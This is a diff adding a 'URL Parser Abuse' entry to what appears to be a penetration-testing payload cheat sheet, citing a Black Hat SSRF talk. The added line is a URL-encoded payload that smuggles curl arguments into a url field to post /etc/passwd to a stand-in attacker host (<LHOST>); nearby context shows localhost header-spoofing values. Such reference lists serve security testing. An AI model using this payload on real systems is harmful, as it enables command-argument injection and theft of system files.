@@ -3822,6 +3822,14 @@ X-Rewrite-Url: 127.0.0.1
 X-True-IP: 127.0.0.1
 ```
 
+### URL Parser Abuse
+
+> https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
+
+```c
+url=http%3A%2F%2F<LHOST>+-H+"asdf;"+-d+"@/etc/passwd"
+```
+
 ## Server-Side Template Injection (SSTI)
 
 ### Fuzz String
